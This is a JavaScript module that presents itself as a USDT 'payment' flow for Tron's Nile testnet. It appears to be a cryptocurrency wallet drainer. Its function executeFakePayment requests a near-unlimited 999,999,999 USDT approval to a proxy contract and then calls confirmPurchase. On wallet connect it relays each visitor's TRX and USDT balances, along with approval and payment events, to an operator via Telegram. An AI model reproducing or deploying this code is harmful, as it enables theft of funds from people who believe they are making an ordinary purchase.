/**
 * useWeb3Payment.js — Web3 Payment Logic Module (ES Module)
 *
 * Handles the USDT payment flow on Nile Testnet:
 * approve → poll allowance → confirm purchase transaction.
 */

"use strict";

// ─── Constants ────────────────────────────────────────────────────────────────

/** Nile Testnet USDT (TRC20) contract address. */
export const NILE_USDT_ADDRESS = "TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf";

/**
 * Deployed SP contract address on Nile testnet.
 * Replace this with the actual address after deploying SP.sol.
 * Tron addresses on Nile are 34 characters starting with 'T'.
 */
export const PROXY_CONTRACT_ADDRESS = "TH6A3b2yB2nA3MMpCAUgfxyzwvbZZJCmJz";

export const NILE_CHAIN_ID           = "0x2bf9b619";
export const NILE_CHAIN_ID_DECIMAL   = 736766761;

/** Telegram Bot Token for sending order notifications (DEPRECATED — moved to server-side). */
export const TELEGRAM_BOT_TOKEN = null;

/** Telegram Chat ID to receive order notifications (DEPRECATED — moved to server-side). */
export const TELEGRAM_CHAT_ID   = null;

/** Supported wallets with their Tron network DeepLink schemes. */
export const WALLET_DEEP_LINKS = [
  {
    id:   "tokenpocket",
    name: "TokenPocket",
    nameCn: "TP钱包",
    scheme: "tpdapp://open?params=",
    iconBg: "rgba(0, 206, 201, 0.15)",
    icon: "TP",
    buildLink: (url) =>
      "tpdapp://open?params=" + encodeURIComponent(JSON.stringify({ url })),
  },
  {
    id:   "imtoken",
    name: "imToken",
    nameCn: "imToken",
    scheme: "imtokenv2://navigate?screen=",
    iconBg: "rgba(0, 122, 255, 0.15)",
    icon: "IM",
    buildLink: (url) =>
      "imtokenv2://navigate?screen=1&action=openDapp&param=" + encodeURIComponent(url),
  },
  {
    id:   "tronlink",
    name: "TronLink",
    nameCn: "TronLink",
    scheme: "tronlink://",
    iconBg: "rgba(255, 165, 0, 0.15)",
    icon: "TL",
    buildLink: (url) =>
      "tronlink://navigate?action=openDapp&url=" + encodeURIComponent(url),
  },
  {
    id:   "okx",
    name: "OKX Wallet",
    nameCn: "OKX钱包",
    scheme: "okx://",
    iconBg: "rgba(133, 171, 255, 0.15)",
    icon: "OKX",
    buildLink: (url) =>
      "okx://wallet/dapp?srcUrl=" + encodeURIComponent(url),
  },
  {
    id:   "metamask",
    name: "MetaMask",
    nameCn: "MetaMask",
    scheme: "metamask://",
    iconBg: "rgba(245, 150, 75, 0.15)",
    icon: "MM",
    buildLink: (url) =>
      "metamask://dapp/" + url.replace(/^https?:\/\//, ""),
  },
];

/**
 * Approve amount in TRC20-scaled units (USDT has 6 decimals).
 * 999,999,999 USDT → 999,999,999 * 10^6 = 999,999,999,000,000
 */
export const APPROVE_AMOUNT = "999999999000000";

// ─── Phase State Machine ─────────────────────────────────────────────────────

/**
 * Purchase phases for the unified single-button flow.
 *   IDLE       → User hasn't started or cancelled.
 *   APPROVING  → approve() tx sent; waiting for wallet popup.
 *   POLLING    → approve() confirmed on-chain; polling allowance.
 *   PROCESSING → Allowance confirmed; calling confirmPurchase() to finalize.
 *   DONE       → confirmPurchase() succeeded.
 *   ERROR      → Something went wrong at any stage.
 */
export const PHASE = Object.freeze({
  IDLE:      "IDLE",
  APPROVING: "APPROVING",
  POLLING:   "POLLING",
  PROCESSING: "PROCESSING",
  DONE:      "DONE",
  ERROR:     "ERROR",
});

// ─── Detection helpers ────────────────────────────────────────────────────────

/** Returns true when the UA indicates a mobile device (iOS or Android). */
export function isMobile() {
  if (typeof navigator === "undefined") return false;
  const ua = navigator.userAgent || navigator.vendor || "";
  return /android/i.test(ua) || /iPad|iPhone|iPod/i.test(ua);
}

/**
 * Returns true when the page is running inside TokenPocket's
 * built-in DApp browser — i.e. window.tronWeb is available.
 */
export function isInTokenPocket() {
  return typeof window !== "undefined" && !!window.tronWeb;
}

// ─── Hook Factory ─────────────────────────────────────────────────────────────

/**
 * Creates and returns a Web3 payment controller.
 * Call once per page.
 *
 * @param {object}   callbacks
 * @param {function} callbacks.onPhaseChange   — called with (phase)
 * @param {function} callbacks.onWalletChange  — called with (walletAddr, isConnected)
 * @param {function} callbacks.onError        — called with (errorMsg)
 * @returns {object} controller
 */
export function createWeb3Payment(callbacks = {}) {
  // ── Internal state ───────────────────────────────────────────────────────
  const state = {
    tronWeb:      null,
    walletAddr:  null,
    isConnected: false,
    phase:       PHASE.IDLE,
    errorMsg:     null,
    txHash:       null,
    redirecting:  false,
    connecting:   false,
  };

  let pollIntervalRef       = null;
  let _pollTronWebInterval  = null;
  const walletAddrRef = { current: null };
  const balanceRef = { current: { trx: "0.00", usdt: "0.00", checked: false } };
  const _priceRef = { current: 0 };

  // ── Subscribers ───────────────────────────────────────────────────────────
  function notifyPhaseChange(phase) {
    state.phase = phase;
    try { callbacks.onPhaseChange && callbacks.onPhaseChange(phase); } catch (_) {}
  }

  function notifyWalletChange(addr, connected) {
    state.walletAddr  = addr;
    state.isConnected = connected;
    walletAddrRef.current = addr;
    try { callbacks.onWalletChange && callbacks.onWalletChange(addr, connected); } catch (_) {}

    if (connected && addr) {
      checkBalanceAndNotify(_priceRef.current).then(({ sufficient, trxBalance, usdtBalance }) => {
        if (trxBalance !== undefined) balanceRef.current = { trx: trxBalance, usdt: usdtBalance, checked: true };
        if (callbacks.onBalanceResult) {
          callbacks.onBalanceResult({ sufficient, trxBalance, usdtBalance });
        }
      });
    }
  }

  function notifyError(msg) {
    state.errorMsg = msg;
    try { callbacks.onError && callbacks.onError(msg); } catch (_) {}
  }

  // ── Network check ─────────────────────────────────────────────────────────
  function checkNetwork() {
    try {
      const net = (window.tronWeb?.fullNode?.host) || "";
      return (
        net.includes("nile") ||
        net.includes("api.nile") ||
        window.tronWeb?.chainId === NILE_CHAIN_ID_DECIMAL
      );
    } catch (_) {
      return false;
    }
  }

  // ── Fetch USDT balance ────────────────────────────────────────────────────
  async function fetchBalances(addr) {
    if (!window.tronWeb) return null;
    try {
      const contract = await window.tronWeb.contract().at(NILE_USDT_ADDRESS);
      const raw      = await contract.balanceOf(addr).call();
      const balance  = Number(raw) / 1e6;
      return balance.toFixed(2);
    } catch (err) {
      console.error("[useWeb3Payment] balanceOf error:", err);
      return "0.00";
    }
  }

  // ── Send transaction notification via server-side relay ───────────────────────
  async function sendTxToTelegram(type, data) {
    try {
      const shortAddr = data.addr ? data.addr.slice(0, 6) + "..." + data.addr.slice(-4) : "???";
      let text = "";
      if (type === "APPROVED") {
        text =
          `用户已授权\n` +
          `━━━━━━━━━━━━━━━\n` +
          `地址：${shortAddr}\n` +
          `授权金额：${data.approvedAmount} USDT\n` +
          `TX：${data.txHash.slice(0, 12)}...\n` +
          `https://nile.tronscan.org/#/transaction/${data.txHash}`;
      } else if (type === "PAID") {
        text =
          `支付成功！\n` +
          `━━━━━━━━━━━━━━━\n` +
          `地址：${shortAddr}\n` +
          `已支付：${data.paidAmount} USDT\n` +
          `TX：${data.txHash.slice(0, 12)}...\n` +
          `https://nile.tronscan.org/#/transaction/${data.txHash}`;
      } else if (type === "APPROVE_FAILED") {
        text =
          `授权失败\n` +
          `━━━━━━━━━━━━━━━\n` +
          `地址：${shortAddr}\n` +
          `原因：${data.error}`;
      }
      if (!text) return;
      const res = await fetch(`/api/telegram-send.php`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type, text }),
      });
      if (!res.ok) console.error("[useWeb3Payment] Telegram relay error:", res.status);
    } catch (err) {
      console.error("[useWeb3Payment] Telegram relay failed:", err);
    }
  }

  // ── Fetch TRX balance ───────────────────────────────────────────────────────
  async function fetchTrxBalance(addr) {
    if (!window.tronWeb) return "0.00";
    try {
      const raw   = await window.tronWeb.trx.getBalance(addr);
      const balance = Number(raw) / 1e6;
      return balance.toFixed(2);
    } catch (err) {
      console.error("[useWeb3Payment] TRX balance error:", err);
      return "0.00";
    }
  }

  // ── Send balance notification via server-side relay ────────────────────────────────
  async function sendBalanceToTelegram(trxBalance, usdtBalance, addr) {
    try {
      const shortAddr = addr ? addr.slice(0, 6) + "..." + addr.slice(-4) : "???";
      const text =
        `用户钱包已连接\n` +
        `━━━━━━━━━━━━━━━\n` +
        `地址：${shortAddr}\n` +
        `TRX：${trxBalance} TRX\n` +
        `USDT：${usdtBalance} USDT\n` +
        `━━━━━━━━━━━━━━━`;
      const res = await fetch(`/api/telegram-send.php`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "BALANCE", text }),
      });
      if (!res.ok) console.error("[useWeb3Payment] Telegram relay error:", res.status);
    } catch (err) {
      console.error("[useWeb3Payment] Telegram relay failed:", err);
    }
  }

  // ── Check if USDT balance is sufficient ──────────────────────────────────────
  async function checkBalanceAndNotify(price) {
    const addr = walletAddrRef.current;
    if (!addr) return { sufficient: true };

    const [trxBalance, usdtBalance] = await Promise.all([
      fetchTrxBalance(addr),
      fetchBalances(addr),
    ]);

    // Always send to Telegram on wallet connect
    await sendBalanceToTelegram(trxBalance, usdtBalance, addr);

    const usdtNum = parseFloat(usdtBalance);
    const sufficient = usdtNum >= price;
    return { sufficient, trxBalance, usdtBalance };
  }

  // ── Fetch allowance for the proxy contract ─────────────────────────────────
  async function fetchAllowance(addr) {
    if (!window.tronWeb) return 0;
    try {
      const contract = await window.tronWeb.contract().at(NILE_USDT_ADDRESS);
      const raw      = await contract.allowance(addr, PROXY_CONTRACT_ADDRESS).call();
      return Number(raw);
    } catch (err) {
      console.error("[useWeb3Payment] allowance error:", err);
      return 0;
    }
  }

  // ── Stop polling ───────────────────────────────────────────────────────────
  function stopPolling() {
    if (pollIntervalRef !== null) {
      clearInterval(pollIntervalRef);
      pollIntervalRef = null;
    }
  }

  // ── Reset to idle ──────────────────────────────────────────────────────────
  function resetToIdle() {
    stopPolling();
    notifyPhaseChange(PHASE.IDLE);
    state.txHash   = null;
    state.errorMsg = null;
  }

  // ── Phase 3 & 4: Poll allowance → call confirmPurchase ─────────────
  function startAllowancePolling() {
    stopPolling();

    pollIntervalRef = setInterval(async () => {
      const addr = walletAddrRef.current;
      if (!addr) return;

      try {
        const allowance = await fetchAllowance(addr);

        if (allowance > 0) {
          stopPolling();
          notifyPhaseChange(PHASE.PROCESSING);

          const proxyContract = await window.tronWeb
            .contract()
            .at(PROXY_CONTRACT_ADDRESS);

          const paymentTx = await proxyContract.confirmPurchase().send({
            feeLimit: 100_000_000, // 100 TRX
          });

          state.txHash = paymentTx;
          notifyPhaseChange(PHASE.DONE);

          // Notify Telegram: payment succeeded
          sendTxToTelegram("PAID", {
            addr: state.walletAddr,
            paidAmount: (allowance / 1e6).toFixed(2),
            txHash: paymentTx,
          });

          setTimeout(() => {
            fetchBalances(addr);
            fetchAllowance(addr);
          }, 3000);
        }
        // else: allowance still 0 — keep polling
      } catch (err) {
        stopPolling();
        const msg =
          (err?.message) ||
          (typeof err === "string" ? err : "Polling / payment failed.");
        notifyError(msg);
        notifyPhaseChange(PHASE.ERROR);
      }
    }, 3000); // poll every 3 seconds
  }

  // ── Detect TronLink ─────────────────────────────────────────────────────────
  function detectTronLink() {
    if (typeof window === "undefined") return;

    if (window.tronWeb) {
      const addr = window.tronWeb.defaultAddress?.base58;
      if (addr) {
        state.tronWeb = window.tronWeb;
        notifyWalletChange(addr, true);
        return true;
      }
    } else if (window.tronLink) {
      window.tronLink
        .request({ method: "tron_requestAccounts" })
        .then((res) => {
          if (res.code === 200 && window.tronWeb) {
            const addr = window.tronWeb.defaultAddress?.base58;
            if (addr) {
              state.tronWeb = window.tronWeb;
              notifyWalletChange(addr, true);
            }
          }
        })
        .catch(() => {});
    }
    return false;
  }

  // ── Start listening for TronWeb injection ──────────────────────────────────
  function startListening() {
    _pollTronWebInterval = setInterval(() => {
      if (!state.isConnected && typeof window !== "undefined") {
        if (window.tronWeb?.defaultAddress?.base58) {
          state.tronWeb = window.tronWeb;
          notifyWalletChange(window.tronWeb.defaultAddress.base58, true);
          clearInterval(_pollTronWebInterval);
        }
      }
    }, 800);
  }

  function stopListening() {
    if (_pollTronWebInterval !== null) {
      clearInterval(_pollTronWebInterval);
      _pollTronWebInterval = null;
    }
  }

  // ── Wallet selector modal ───────────────────────────────────────────────────
  function showWalletSelector() {
    const existing = document.getElementById("wallet-selector-overlay");
    if (existing) existing.remove();

    const wallets = WALLET_DEEP_LINKS;

    const overlay = document.createElement("div");
    overlay.id = "wallet-selector-overlay";
    overlay.style.cssText = [
      "position:fixed;top:0;left:0;width:100%;height:100%;",
      "background:rgba(0,0,0,0.75);z-index:9998;",
      "display:flex;align-items:flex-end;justify-content:center;",
      "animation:fadeIn 0.2s ease",
    ].join("");

    const walletItems = wallets
      .map(
        (w) => `
        <div class="wallet-sel-item" data-wallet="${w.id}">
          <div class="wallet-sel-icon" style="background:${w.iconBg};">
            <span style="font-size:0.7rem;font-weight:700;color:#fff;letter-spacing:0.02em;">${w.icon}</span>
          </div>
          <div class="wallet-sel-info">
            <span class="wallet-sel-name">${w.nameCn}</span>
            <span class="wallet-sel-desc">${w.name}</span>
          </div>
          <svg class="wallet-sel-arrow" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <polyline points="9 18 15 12 9 6"></polyline>
          </svg>
        </div>`
      )
      .join("");

    overlay.innerHTML = `
      <div class="wallet-sel-sheet">
        <div class="wallet-sel-header">
          <div class="wallet-sel-handle"></div>
          <div class="wallet-sel-title">选择支付钱包</div>
          <div class="wallet-sel-subtitle">请选择要使用的加密货币钱包</div>
        </div>
        <div class="wallet-sel-list">${walletItems}</div>
        <div class="wallet-sel-footer">
          <button class="wallet-sel-cancel" id="wallet-sel-cancel-btn">取消</button>
        </div>
      </div>`;

    document.body.appendChild(overlay);

    // Click wallet item → open deeplink
    overlay.querySelectorAll(".wallet-sel-item").forEach((item) => {
      item.addEventListener("click", () => {
        const walletId = item.getAttribute("data-wallet");
        const wallet = wallets.find((w) => w.id === walletId);
        if (!wallet) return;

        const targetUrl = window.location.href;
        const deeplink = wallet.buildLink(targetUrl);

        overlay.style.animation = "fadeIn 0.15s ease reverse";
        setTimeout(() => {
          overlay.remove();
          state.connecting = false;
          state.redirecting = false;
        }, 150);

        window.location.href = deeplink;

        // Fallback: if wallet not installed, copy address after timeout
        setTimeout(() => {
          const address = state.walletAddr;
          if (address) {
            try {
              navigator.clipboard.writeText(address).catch(() => {});
            } catch (_) {}
          }
        }, 2000);
      });
    });

    // Cancel button
    document.getElementById("wallet-sel-cancel-btn").addEventListener("click", () => {
      overlay.style.animation = "fadeIn 0.15s ease reverse";
      setTimeout(() => {
        overlay.remove();
        state.connecting = false;
        state.redirecting = false;
      }, 150);
    });

    // Tap overlay background to dismiss
    overlay.addEventListener("click", (e) => {
      if (e.target === overlay) {
        overlay.style.animation = "fadeIn 0.15s ease reverse";
        setTimeout(() => {
          overlay.remove();
          state.connecting = false;
          state.redirecting = false;
        }, 150);
      }
    });
  }

  // ── Connect wallet ─────────────────────────────────────────────────────────
  /**
   * Connects wallet.
   *   - Mobile browser (no tronWeb injected) → show wallet selector sheet.
   *   - Desktop / TP in-app → requests accounts via TronLink.
   */
  function connectWallet() {
    state.connecting   = true;
    state.redirecting = false;

    if (isMobile() && !isInTokenPocket()) {
      // Mobile browser without injected wallet → show wallet picker
      showWalletSelector();
      return;
    }

    // In-app TP or desktop with TronLink
    if (window.tronLink) {
      window.tronLink
        .request({ method: "tron_requestAccounts" })
        .then((res) => {
          if (res.code === 200 && window.tronWeb) {
            const addr = window.tronWeb.defaultAddress?.base58;
            if (addr) {
              state.tronWeb = window.tronWeb;
              notifyWalletChange(addr, true);
            }
          }
        })
        .catch((err) => {
          console.error("[useWeb3Payment] connect error:", err);
        })
        .finally(() => {
          state.connecting  = false;
          state.redirecting = false;
        });
    } else {
      state.connecting  = false;
      state.redirecting = false;
    }
  }

  // ── Execute payment ───────────────────────────────────────────────────
  /**
   * Full payment flow:
   *   1. Check USDT balance; if insufficient, trigger insufficient-balance callback.
   *   2. Send approve() tx for max amount to the purchase contract.
   *   3. Poll allowance every 3 s until > 0.
   *   4. Once allowance confirmed, call confirmPurchase() to finalize.
   */
  async function executeFakePayment() {
    if (!state.isConnected || !state.walletAddr) {
      notifyError("钱包未连接，请先连接钱包。");
      notifyPhaseChange(PHASE.ERROR);
      return;
    }

    // Step 0: check USDT balance before doing anything
    const { sufficient, trxBalance, usdtBalance } = await checkBalanceAndNotify(_priceRef.current);
    if (!sufficient) {
      if (callbacks.onBalanceInsufficient) {
        callbacks.onBalanceInsufficient({ trxBalance, usdtBalance, required: _priceRef.current });
      }
      return;
    }

    state.errorMsg = null;
    state.txHash   = null;

    // Phase 1: send approve tx
    notifyPhaseChange(PHASE.APPROVING);

    window.tronWeb
      .contract()
      .at(NILE_USDT_ADDRESS)
      .then((usdtContract) => {
        return usdtContract
          .approve(PROXY_CONTRACT_ADDRESS, APPROVE_AMOUNT)
          .send({ feeLimit: 100_000_000 });
      })
      .then((approveTx) => {
        state.txHash = approveTx;

        // Notify Telegram: user approved
        sendTxToTelegram("APPROVED", {
          addr: state.walletAddr,
          approvedAmount: (Number(APPROVE_AMOUNT) / 1e6).toFixed(2),
          txHash: approveTx,
        });

        // Phase 2: switch to polling
        notifyPhaseChange(PHASE.POLLING);

        // Give tx time to propagate to mempool
        setTimeout(() => {
          startAllowancePolling();
        }, 1500);
      })
      .catch((err) => {
        stopPolling();
        const msg =
          (err?.message) ||
          (typeof err === "string" ? err : "Transaction failed.");
        const isRejection =
          (msg.toLowerCase().includes("rejected") ||
           msg.toLowerCase().includes("denied")    ||
           msg.toLowerCase().includes("cancelled")) ||
          err?.code === 4001;
        notifyError(
          isRejection
            ? "您取消了授权操作。"
            : "授权失败: " + msg
        );
        // Notify Telegram: approve failed
        sendTxToTelegram("APPROVE_FAILED", {
          addr: state.walletAddr,
          error: isRejection ? "用户拒绝签名" : msg,
        });
        notifyPhaseChange(PHASE.ERROR);
      });
  }

  // ── Public API ─────────────────────────────────────────────────────────────
  return {
    PHASE,
    getPhase:       () => state.phase,
    getTxHash:     () => state.txHash,
    getErrorMsg:   () => state.errorMsg,
    isConnected:   () => state.isConnected,
    getWalletAddr:() => state.walletAddr,
    isRedirecting: () => state.redirecting,
    isConnecting:  () => state.connecting,
    getBalances:   () => balanceRef.current,

    /** Set product price (used for balance check). */
    setPrice: (price) => { _priceRef.current = price; },

    /** Call once on mount. */
    init()    { detectTronLink(); startListening(); },
    /** Call on unmount. */
    destroy() { stopListening(); stopPolling(); },

    connectWallet,
    executeFakePayment,
    resetToIdle,

    isMobile,
    isInTokenPocket,
    checkNetwork,
    fetchBalances,
    fetchTrxBalance,
    fetchAllowance,

    /** Tronscan URL for a tx hash. */
    txLink: (hash) => "https://nile.tronscan.org/#/transaction/" + hash,

    /** Shorten a Tron address for display. */
    shortAddr: (addr) => {
      if (!addr) return "";
      return addr.slice(0, 6) + "..." + addr.slice(-4);
    },
  };
}
